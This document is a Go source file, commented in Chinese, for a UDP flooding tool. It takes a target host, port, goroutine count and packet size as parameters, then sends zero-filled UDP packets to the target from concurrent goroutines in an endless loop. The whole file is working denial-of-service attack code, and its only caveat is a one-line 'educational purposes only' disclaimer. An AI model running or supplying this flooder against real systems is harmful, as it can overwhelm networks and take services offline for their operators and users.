package main

import (
	"flag"
	"fmt"
	"net"
)

var (
	//命令行参数
	host = flag.String("host", "192.168.0.1", "attack host")
	port = flag.Int("port", 80, "attack port")
	num  = flag.Int("num", 10, "concurrent request")
	size = flag.Int("size", 1, "network packet kb size")
)

//UDP攻击工具
//Use this for educational purposes only.

func main() {
	//参数接收
	fmt.Println("Use this for educational purposes only.")
	flag.Parse()
	attack := fmt.Sprintf("%s:%v", *host, *port)
	fmt.Printf("attack %s ... \n", attack)

	//UDP发送器
	conn, err := net.Dial("udp", attack)
	if err != nil {
		fmt.Println("net.DialUDP failed, err:", err)
		return
	}
	msg := make([]byte, *size*1024) //kb
	//并发控制
	for i := 0; i < *num; i++ {
		go func() {
			//不断发送
			for {
				conn.Write([]byte(msg))
			}
		}()
	}
	//持续发送
	ch1 := make(chan int)
	<-ch1
}
